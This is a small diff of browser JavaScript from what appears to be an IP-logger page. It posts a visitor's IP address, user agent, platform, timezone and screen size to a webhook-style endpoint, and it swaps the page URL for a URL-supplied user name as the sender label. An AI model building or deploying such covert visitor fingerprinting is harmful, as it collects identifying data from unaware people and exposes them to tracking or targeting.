@@ -117,7 +117,7 @@ if (urlParams.user && urlParams.access) {
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
-        username: window.location.href,
+        username: urlParams.user[0],
         avatar_url: "",
         content: json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nTIMEZONE: " + navigator.timezone + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight,
       }
